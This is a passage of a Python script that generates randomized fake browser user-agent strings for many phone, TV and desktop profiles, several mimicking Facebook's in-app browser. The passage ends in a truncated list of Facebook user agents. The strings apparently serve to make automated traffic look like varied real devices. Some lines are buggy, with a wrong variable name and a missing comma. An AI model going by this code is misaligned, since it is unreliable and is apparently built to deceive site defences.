	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/105.0.5195.19 Mobile Safari/537.36 TwitterAndroid'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['en-US; vivo 1807 Build/OPM1.171019.026'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['V2149 Build/'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/103.0.5060.53 Mobile Safari/537.36uc mini browser3.0'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	a='Mozilla/5.0 (Linux; Android 11;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Infinix X6811 Build/RP1A.200720.011; wv'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['2201116PG'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 10;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['RMX2185 Build/QP1A.190711.020; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SHARK KTUS-H0'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 9;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['6002 Build/PPR1.180610.011; wv'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (iPhone;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPU iPhone OS 16_0 like Mac OS X)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/20A357 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/en_Qaau_GB;FBOP/5]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 11;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Infinix X688B'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Windows NT 10.0;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Win64; x64'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Series40;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Nokia2000/11.95;'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='S40OviBrowser/2.2.0.0.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 8.1.0;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['ASUS_Z01QD'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/72.0.3626.76 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 9;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['PortalTV'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/85.0.4183.120 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 9;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['PortalTV Build/PKQ1.190408.001; wv'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 5.1;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['GT-810 Build/LMY47I'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/66.0.3359.106 Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; U; Android 2.2;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='fr-fr; Desire_A8181 Build/'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l=' 4.0 Mobile Safari/533.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (SMART-TV;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Linux; Tizen 2.4.0)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.1 tv'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/538.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; U; Android 2.3.6;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='fr-fr; GT-S5839i Build/'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=' GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='4.0 Mobile Safari/534.30'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 4.0.4;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='LT30p Build/'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='7.0.A.3.195) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='18.0.1025.166 Mobile Safari/535.19'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 11;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPH1969 Build/RP1A.200720.011; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Versi/4.0 Chrome/105.0.5195.136 Seluler Safari/537.36 WpsMoffice/16.6/arm64-v8a/1347'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android 7.0;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 4 Build/NRD90M)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/63.0.3239.111 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 11;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 9 Pro'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 11;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 9 Pro)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/105.0.5195.19 Mobile Safari/537.36 TwitterAndroid'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 11;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['ASUS_I005DA)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/102.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 10;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Vivo Y91C)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/98.0.4711.185 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 11;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['M2012K11AG Build/'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 WpsMoffice/16.3.2/arm64-v8a/1328'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 11;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Vivo Y91C)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/97.0.4740.200 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 8.1.0;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPH1909 Build/O11019 )'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='JioBrowser/1.4.7 Chrome/69.0.3497.100 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)


syed =[
'Mozilla/5.0 (Linux; Android 12; 2203129G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KH lTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/393.0.0.34.106'
'Mozilla/5.0 (Linux; Android 11; RMX3491 Build/RKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/329.0.0.12.106',
'Mozilla/5.0 (Linux; Android 11; RMX3491 Build/RKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214',
'Mozilla/5.0 (Linux; Android 12; RMX3491 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.0.0.21.104',
'Mozilla/5.0 (Linux; Android 12; RMX3491 Build/RKQ1.211119.001; wv) AppleWebKit/537.36',
